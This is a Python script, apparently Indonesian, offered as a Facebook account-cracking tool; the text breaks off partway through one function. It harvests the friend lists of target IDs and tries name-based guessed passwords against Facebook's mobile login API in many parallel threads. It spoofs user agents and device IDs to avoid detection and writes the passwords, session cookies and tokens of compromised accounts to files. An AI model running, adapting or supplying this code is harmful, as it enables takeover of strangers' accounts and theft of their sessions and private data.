# ---- import module.
import requests, os, random, datetime, time, re, uuid, sys
from concurrent.futures import ThreadPoolExecutor as tred
ses = requests.Session()

# ---- import rich.
from rich import print as prints
from rich.panel import Panel as panel

# ---- append dll.
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
method=[]
pwnya=[]
rr = random.randint
rc = random.choice

# ---- warna.
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

# ---- warna rich.
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

# ---- tanggal bulan tahun.
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# ---- clear.
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
	
# ---- logo banner.
def banner():
	print(f"""{U}
    ________    _______  __     
   |"      "\  /"     "||" \    
   (.  ___  :)(: ______)||  |   
   |: \   ) || \/    |  |:  |   
   (| (___\ || // ___)  |.  |   
   |:       :)(:  (     /\  |\  
   (________/  \__/    (__\_|_)""")
   
# ---- login cookies.
def login2():
	banner()
	print(f"\n{P}  - masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f"  - notice: jika tetap invalid,gunakan akun tumbal dengan id 10008 kebawah.")
	print(f"  - notice: gunakan mode dekstop pada browser saat pengambilan cookies.")
	cok = input(f'  - cookies : {H}')
	open('.cok.txt', 'a').write(cok)
	try:
		ses.headers.update({
		   'Accept-Language': 'id,en;q=0.9',
		   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
		   'Referer': 'https://www.instagram.com/',
		   'Host': 'www.facebook.com',
		   'Sec-Fetch-Mode': 'cors',
		   'Accept': '*/*',
		   'Connection': 'keep-alive',
		   'Sec-Fetch-Site': 'cross-site',
		   'Sec-Fetch-Dest': 'empty',
		   'Origin': 'https://www.instagram.com',
		   'Accept-Encoding': 'gzip, deflate',})
		response = ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/rendragunabinawan/', cookies={'cookie':cok})
		if '"access_token":' in str(response.headers):
			token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
			open('.token.txt', 'a').write(token)
			exit(f"{P}  - token : {H}{token}{P} \n  - cookies aktif,jalankan ulang perintah nya dengan ketik python run.py");time.sleep(3)
		else:
			exit(f'{P}  - cookie kamu invalid silahkan menggunakan tumbal/cookies lain.')
	except Exception as e:exit(e)
	
# ----> menu script.
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P}  - cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login2()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P}  - Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P}  - sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login2()
	prints(f"\n[bold white]  • Halo [green]{nama}[/] selamat datang di tools crack fb")
	prints(f"[bold white]\n  • pastikan id target publik/tidak private.[/]")
	try:total = int(input(f"{P}  • masukan jumlah target : {H}"))
	except:total=1
	for mnh in range(total):
		mnh +=1
		idd = input(f'{P}  • input id ke '+str(mnh)+f' : {H}')
		uid.append(idd)
	for xxx in uid:
		try:
			req = ses.get(f'https://graph.facebook.com/{xxx}?fields=friends.fields(id,name)&access_token={token}',cookies = {'cookies':cok}).json()
			for x in req['friends']['data']:
				try:
					iid,nama = x["id"],x["name"]
					tampung = str(iid)+'|'+str(nama)
					id.append(tampung)
				except:pass
				sys.stdout.write(f"\r  • sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
				sys.stdout.flush()
		except KeyError:pass
		except requests.exceptions.ConnectionError:exit(f'  • koneksi buruk, silahkan refresh jaringan anda. ')
	try:
		setting()
	except requests.exceptions.ConnectionError:exit(f'  • koneksi buruk, silahkan refresh jaringan anda. ')
	
# ---- setting urutan & metode.
def setting():
	print("")
	print(f"\n{P}  - 1. urutan old ke new. \n  - 2. urutan new ke old. \n  - 3. urutan random. {P}")
	urutan_setting = input(f'\n  - pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"""{P}
  - 1. login metode Graph Recovery.
  - 2. login metode Api Recovery.
  - 3. login metode Reguler.
  - 4. login metode Validate.""")
	login_metode = input(f'\n  - pilih 1/4 : ')
	if login_metode in ["1","01"]:
		print(f"\n{P}  - anda menggunakan metode Graph 1")
		method.append('API')
	elif login_metode in ["2","02"]:
		print(f"\n{P}  - anda menggunakan metode Graph 2")
		method.append('APII')
	elif login_metode in ["3","03"]:
		print(f"\n{P}  - anda menggunakan metode Reguler")
		method.append('Reguler')
	elif login_metode in ["4","04"]:
		print(f"\n{P}  - anda menggunakan metode Validate")
		method.append('Valid')
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}  - 1. password otomatis. \n  - 2. password gabung. \n  - 3. password manual.")
	password_metode = input(f'\n  - pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
		
# ---- set password otomatis.
def Otomatis():
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}ESBFLIVE/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}ESBFCHEK/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			try:blkg = nama.split(' ')[1]
			except:blkg = depan
			pasw = []
			if len(nama)<=5:
				if len(depan)<3:
					pass
				else:
					#pasw.append(nama)
					pasw.append(depan+"123@")
					#pasw.append(depan+"123.")
					pasw.append(depan+"01")
					pasw.append(depan+"02")
					pasw.append(depan+"03")
					pasw.append(depan+"12")
					pasw.append(depan+"2001")
					pasw.append(depan+"2002")
					pasw.append(depan+"2003")
					pasw.append(depan+"2004")
			else:
				if len(depan)<3:
					pasw.append(nama)
				else:
					#pasw.append(nama)
					pasw.append(depan+"123@")
					#pasw.append(depan+"123.")
					pasw.append(depan+"01")
					pasw.append(depan+"02")
					pasw.append(depan+"03")
					pasw.append(depan+"12")
					pasw.append(depan+"2001")
					pasw.append(depan+"2002")
					pasw.append(depan+"2003")
					pasw.append(depan+"2004")
			if 'API' in method:
				MethodeCrack.submit(APII,uid,pasw)
			elif 'APII' in method:
				MethodeCrack.submit(APX,uid,pasw)
			elif 'Reguler' in method:
				MethodeCrack.submit(Reg,uid,pasw)
			elif 'Valid' in method:
				MethodeCrack.submit(Val,uid,pasw)
			else:
				MethodeCrack.submit(Val,uid,pasw)
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")

# ---- set password gabung.
def Gabung():
	pw_manual=input(f'\n  - input password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}ESBFLIVE/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}ESBFCHEK/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=35) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			try:blkg = nama.split(' ')[1]
			except:blkg = depan
			pasw = []
			if len(nama)<=5:
				if len(depan)<3:
					pass
				else:
					#pasw.append(nama)
					pasw.append(depan+"123")
					pasw.append(depan+"12345")
					pasw.append(depan+"01")
					pasw.append(depan+"02")
					pasw.append(depan+"03")
					#pasw.append(depan+"12")
			else:
				if len(depan)<3:
					pasw.append(nama)
				else:
					#pasw.append(nama)
					pasw.append(depan+"123")
					pasw.append(depan+"12345")
					pasw.append(depan+"01")
					pasw.append(depan+"02")
					pasw.append(depan+"03")
					#pasw.append(depan+"12")
			for xpwd in pwnya:
					pasw.append(xpwd)
			if 'API' in method:
				MethodeCrack.submit(APII,uid,pasw)
			elif 'APII' in method:
				MethodeCrack.submit(APX,uid,pasw)
			elif 'Reguler' in method:
				MethodeCrack.submit(Reg,uid,pasw)
			elif 'Valid' in method:
				MethodeCrack.submit(Val,uid,pasw)
			else:
				MethodeCrack.submit(Val,uid,pasw)
	print("\r")
	print(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
	
# ---- set password manual.
def Manual():
	pw_manual=input(f'\n  - input password manual : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}ESBFLIVE/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}ESBFCHEK/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=50) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			if 'API' in method:
				MethodeCrack.submit(APII,uid,pasw)
			elif 'APII' in method:
				MethodeCrack.submit(APX,uid,pasw)
			elif 'Reguler' in method:
				MethodeCrack.submit(Reg,uid,pasw)
			elif 'Valid' in method:
				MethodeCrack.submit(Val,uid,pasw)
			else:
				MethodeCrack.submit(Val,uid,pasw)
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")

# ---- menu useragent.
def ugen():
	rr = random.randint
	rc = random.choice
	aa = f"Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,125))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Safari/537.36 SmartTV/9.0 Crow/1.0"
	bb = f"Mozilla/5.0 (Linux; U; Android 4.2.2; id-id; EVERCOSS A7B Build/JDQ39) AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Chrome/{str(rr(111,125))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Mobile Safari/534.30"
	cc = f"Mozilla/5.0 (Linux; Android 12; VX18 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,125))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Mobile Safari/537.36"
	return rc([bb])
	
def ua_valid():
	rr = random.randint
	rc = random.choice
	androversi = rc(["10","11","12","13","14"])
	chrome_version = f"{str(rr(30,110))}.0.{str(rr(2000,5000))}.{str(rr(45,150))}"
	apk = str(random.randint(300,450))+".1.0.36."+str(random.randint(90,150))
	app = random.randint(450000000,490000000)
	dro = random.choice(['8','9','10','11','12','13'])
	AAA = f"Mozilla/5.0 (Windows; U; Windows NT 6.3; en-US; Valve Steam GameOverlay/1582070848; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Safari/537.36"
	BBB = f"Dalvik/2.1.0 (Linux; U; Android 14; V2245A Build/UP1A.231005.007) [FBAN/Orca-Android;FBAV/{apk};FBPN/com.facebook.orca;FBLC/in_ID;FBBV/{app};FBCR/vivo;FBMF/vivo;FBBD/samsung;FBDV/V2245A;FBSV/9;FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=1080,height=2076};FB_FW/1;] FBBK/1"
	CCC = random.choice([AAA,BBB])
	return (BBB)
	
def rega():
	rr = random.randint
	rc = random.choice
	androversi = rc(["11","12","13"])
	AA = "[FBAN/FB4A;FBAV/"+str(random.randint(99,199))+".0.0."+str(random.randint(10,19))+"."+str(random.randint(60,90))+";FBBV/"+str(random.randint(455555555,499999999))+";FBDM/"+"{density="+str(random.randint(1,3))+"."+str(random.randint(2111111,2999999))+",width="+str(random.randint(600,900))+",height="+str(random.randint(999,2999))+"};FBLC/"+str(random.choice(["vi_VN","sv_SE","en_US","es_ES","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Indosat Ooredoo","T-Mobile","entel","MetroPCS","ASIACELL","SWEDEN","PosteMobile","Proximus","Sprint","DTAC","iD","Telia SE","TELCEL","Vodafone IN","VodafoneNZ","Bitel"]))+";FBMF/samsung;FBBD/"+str(random.choice(["samsung","Xiaomi","asus","LENOVO","OPPO"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["SM-J610G","SM-A750FN","SC51Aa","SM-S918B","SM-G975U","SM-G611MT","SM-A528B","SM-G996B","SM-X906B","SM-A315G","SM-A325M","SM-A115M","SM-A035G","SM-A135M","SM-G781B","SM-A236B","SM-A528B","SM-N981B","SM-F916B","ASUS_X01BDA","CPH2067","SM-A226B","SM-G9600","SM-A307G","SM-X800"]))+";FBSV/14;FBOP/1;FBCA/x86:armeabi-v7a;]"
	#BB = f"Dalvik/2.1.0 (Linux; U; Android {androversi}; SM-G935F Build/QQ3A.200805.001) [FBAN/FB4A;FBAV/"+str(random.randint(311,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(40,150))+";FBBV/"+str(random.randint(311111111,399999999))+";FBDM/"+"{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/"+str(random.randint(311111111,399999999))+";FBCR/Indosat Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/11;FBOP/1;FBCA/x86:armeabi-v7a;]"
	#CC = f"Dalvik/2.1.0 (Linux; U; Android {androversi}; SM-G780G Build/SP1A.210812.016) [FBAN/FB4A;FBAV/"+str(random.randint(311,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(40,150))+";FBBV/"+str(random.randint(311111111,399999999))+";FBDM/"+"{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/"+str(random.randint(311111111,399999999))+";FBCR/Indosat Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G780G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	DD = f"Dalvik/2.1.0 (Linux; U; Android 6.0; G55 Build/MRA58K) [FBAN/Orca-Android;FBAV/"+str(random.randint(300,399))+".0.0."+str(random.randint(10,18))+"."+str(random.randint(110,150))+";FBPN/com.facebook.orca;FBLC/"+str(random.choice(["vi_VN","sv_SE","en_US","es_ES","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL","it_IT","en_IN","es_ES","en_PK"]))+";FBBV/"+str(random.randint(111111111,599999999))+";FBCR/XL Axiata;FBMF/ELEVATE;FBBD/LUNA;FBDV/G55;FBSV/6.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(random.randint(1,3))+"."+str(random.randint(0,9))+",width="+str(random.randint(800,1080))+",height="+str(random.randint(1111,3333))+"};FB_FW/1;] FBBK/1"
	EE = f"Mozilla/5.0 (Linux; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,105))}.0.{str(rr(2222,5555))}.{str(rr(50,150))} Safari/537.36 SRAF/3.6 HbbTV/1.2.1 (; TechniSat; Wegavision UHD; 3.1.1; 67.0; ); CE-HTML/1.0 FXM-U2FsdGVkX1+EYygco5Kh0DLNPVZH5kByFh/vszNrCC7yBbwLuFs82VoXr32C16KH-END"
	return rc([AA])
	
def Memek():
        builds = ["14|RMX3781|UKQ1.230924.001","14|RMX3551|UKQ1.230924.001","14|RMX3783|UKQ1.230924.001","14|RMX1993|UKQ1.230924.001"]
        versi,model,build = random.choice(builds).split('|')
        fbsv = versi
        fbdv = model
        fbmf = "TESLA"
        fbav = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(1, 29)) + '.' + str(random.randint(111, 999))
        fbbv = str(random.randint(000000000, 999999999))
        fbrv = str(random.randint(000000000, 999999999))
        ver = ["FB4A|com.facebook.katana","Orca-Android|com.facebook.orca"]
        fban,fbpn = random.choice(ver).split('|')
        fbca = random.choice(["armeabi-v7a:armeabi","arm64-v8a:null","arm64-v8a:armeabi-v7a:armeabi"])
        dalvik = "Dalvik/2.1.0 (Linux; U; Android "+fbsv+"; "+model+" Build/"+build+") [FBAN/FB4A;FBAV/"+fbav+";FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/"+fbbv+";FBCR/Smartfren 100% untuk Indonesia;FBMF/"+fbmf+";FBBD/"+fbmf+";FBDV/"+model+";FBSV/"+fbsv+";FBCA/"+fbca+";FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;FBRV/"+fbrv+";]"
        return dalvik
        
def Dalvik():
        builds = ["14|SM-S928U1|UP1A.231005.007","14|SM-S928B|UP1A.231005.007","14|SM-S928B/DS|UP1A.231005.007","14|SM-S928U|UP1A.231005.007","14|SM-S928U|UP1A.231005.007","14|SM-S928E|UP1A.231005.007","14|SM-S928W|UP1A.231005.007"]
        versi,model,build = random.choice(builds).split('|')
        fbsv = versi
        fbdv = model
        fbmf = "TESLA"
        fbav = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(1, 19)) + '.' + str(random.randint(111, 555))
        fbbv = str(random.randint(000000000, 999999999))
        fbrv = str(random.randint(000000000, 999999999))
        ver = ["FB4A|com.facebook.katana","Orca-Android|com.facebook.orca"]
        fban,fbpn = random.choice(ver).split('|')
        fbca = random.choice(["armeabi-v7a:armeabi","arm64-v8a:null","arm64-v8a:armeabi-v7a:armeabi"])
        dalvik = "Dalvik/2.1.0 (Linux; U; Android "+fbsv+"; "+model+" Build/"+build+") [FBAN/FB4A;FBAV/"+fbav+";FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/"+fbbv+";FBCR/Smartfren 100% untuk Indonesia;FBMF/"+fbmf+";FBBD/"+fbmf+";FBDV/"+model+";FBSV/"+fbsv+";FBCA/"+fbca+";FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;FBRV/"+fbrv+";]"
        return dalvik

def generate_random_user_agent():
    # Daftar versi Dalvik yang sering digunakan
    dalvik_versions = ["2.1.0","2.1.0","2.1.0","1.6.0","1.5.0"]

    # Daftar versi Android dan device yang umum
    android_versions = ["12","11","10","9","8.1.0","8.0.0"]
    devices = ["SM-A217M","SM-G950F","SM-G965F","Pixel 4a","Redmi Note 9","Huawei P30"]
    builds = ["SP1A.210812.016","RP1A.200720.012","QP1A.190711.020","PPR1.180610.011","OPR6.170623.013"]

    # Atribut Facebook
    fb_versions = ["449.0.0.47.111","340.0.0.15.97","250.0.0.35.121","150.0.0.20.99"]
    fb_apps = ["com.facebook.orca","com.facebook.katana"]
    fb_languages = ["en_US","id_ID","es_ES"]
    fb_networks = ["Indosat","Telkomsel","3","XL","Smartfren"]
    fb_manufacturers = ["samsung","google","xiaomi","huawei","oppo"]
    densities = ["1.0","1.5","2.0","2.5","3.0"]
    widths = ["720","1080","1440","2400"]
    heights = ["1280","1920","2340","2960"]

    # Pilih nilai secara acak dari daftar
    dalvik_version = random.choice(dalvik_versions)
    android_version = random.choice(android_versions)
    device = random.choice(devices)
    build = random.choice(builds)
    fb_version = random.choice(fb_versions)
    fb_app = random.choice(fb_apps)
    fb_language = random.choice(fb_languages)
    fb_network = random.choice(fb_networks)
    fb_manufacturer = random.choice(fb_manufacturers)
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)

    # Format User-Agent
    user_agent = (
        f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device} Build/{build}) "
        f"[FBAN/Orca-Android;FBAV/{fb_version};FBPN/{fb_app};FBLC/{fb_language};"
        f"FBCR/{fb_network};FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};"
        f"FBDV/{device};FBSV/{android_version};FBCA/arm64-v8a:null;"
        f"FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
    )
    return user_agent

# Contoh penggunaan
#for _ in range(3):
    print(generate_random_user_agent())

prints(panel(f"[bold white]{generate_random_user_agent()}[/]",style=f"bold green",title="[ useragent ]",width=70));time.sleep(3)
# ---- login metode.
def APII(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {uid} {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			ua = generate_random_user_agent()
			data = {
'adid': 'f8e9f499-d053-4a4c-96e3-f5659bd086b4',
'format': 'json',
'device_id': '9f4f6fea-d3b6-4af8-96d7-34fd65d2a7e5',
'family_device_id': 'f49026f4-ab96-4cd0-8cb3-c968afdfe68c',
'secure_family_device_id': 'e52e8873-ca6b-43fc-aeab-dff76c042ecc',
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pw,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'id_ID',
'client_country_code': 'ID',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			headers={
'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'unknown',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
			curl = 'https://b-graph.facebook.com/auth/login'
			q = ses.post(curl,data=data, headers=headers, allow_redirects=False,verify=True).json()
			if "session_key" in q:
				ok+=1
				coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
				token = q["access_token"]
				print(f"\r{P}  - {H}{uid}|{pw} -----> OK{P}")
				print(f"\r{P}  - {H}{coki}{token}|{ua}{P}")
				open('/sdcard/ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}|{ua}\n")
				break
			elif 'User must verify their account' in q['error']['message']:
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} -----> CP{P}")
				open('/sdcard/ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(5)
	loop+=1
	
def APX(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {uid} {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			ua = generate_random_user_agent()
			data = {'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': uid,'password': pw,'method': 'auth.login','generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'account_recovery','generate_machine_id':'1','jazoest':'2980','meta_inf_fbmeta':'V2_UNTAGGED','encrypted_msisdn':'','currently_logged_in_userid'